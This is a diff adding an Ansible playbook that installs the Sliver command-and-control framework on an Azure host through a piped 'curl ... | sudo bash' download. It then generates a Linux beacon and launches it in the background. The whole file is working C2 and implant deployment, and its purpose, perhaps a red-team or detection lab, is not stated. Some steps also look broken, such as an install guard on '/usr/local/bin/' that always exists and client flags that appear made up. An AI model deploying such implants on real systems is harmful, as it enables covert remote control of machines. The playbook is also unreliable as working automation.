@@ -1,0 +1,78 @@
+---
+- name: Install Sliver C2 framework and generate beacon on Azure compute instance
+  hosts: azure_instance
+  become: true
+
+  vars:
+    sliver_port: 31337                         # Port for Sliver server
+    beacon_name: "ANXIETY_PRONE_GATOR"
+    beacon_output_path: "/opt/sliver/beacons"
+    beacon_arch: "amd64"                       # Adjust as needed
+    beacon_os: "linux"
+    beacon_jitter: 5
+    beacon_seconds: 15
+
+  tasks:
+    - name: Update apt package index
+      apt:
+        update_cache: yes
+
+    - name: Install required dependencies
+      apt:
+        name:
+          - curl
+        state: present
+
+    - name: Download and install Sliver binary using curl
+      command: "curl https://sliver.sh/install|sudo bash"
+      args:
+        creates: /usr/local/bin/
+
+    - name: Ensure Sliver server binary is executable
+      file:
+        path: /usr/local/bin/sliver-server
+        mode: '0755'
+
+    - name: Ensure Sliver client binary is executable
+      file:
+        path: /usr/local/bin/sliver-client
+        mode: '0755'
+
+    - name: Create directory for Sliver configurations and beacons
+      file:
+        path: "{{ beacon_output_path }}"
+        state: directory
+        mode: '0755'
+
+    - name: Start Sliver server in background to initialize
+      command: "/usr/local/bin/sliver-server --port {{ sliver_port }}"
+      async: 30
+      poll: 0
+      ignore_errors: true
+
+    - name: Wait for Sliver server to initialize
+      pause:
+        seconds: 10
+
+    - name: Generate Sliver beacon for Azure instance
+      command: >
+        /usr/local/bin/sliver-client --server 127.0.0.1:{{ sliver_port }}
+        generate beacon --name {{ beacon_name }} --arch {{ beacon_arch }} --os {{ beacon_os }}
+        --output {{ beacon_output_path }}/{{ beacon_name }}
+      register: beacon_generation
+      environment:
+        SLIVER_SERVER: "172.19.207.123"
+
+    - name: Check beacon generation result
+      debug:
+        var: beacon_generation.stdout
+
+    - name: Display beacon generation success message
+      debug:
+        msg: "Beacon generated at {{ beacon_output_path }}/{{ beacon_name }} for execution."
+
+    - name: Run generated beacon on Azure instance
+      command: "{{ beacon_output_path }}/{{ beacon_name }}"
+      async: 5
+      poll: 0
+      ignore_errors: true
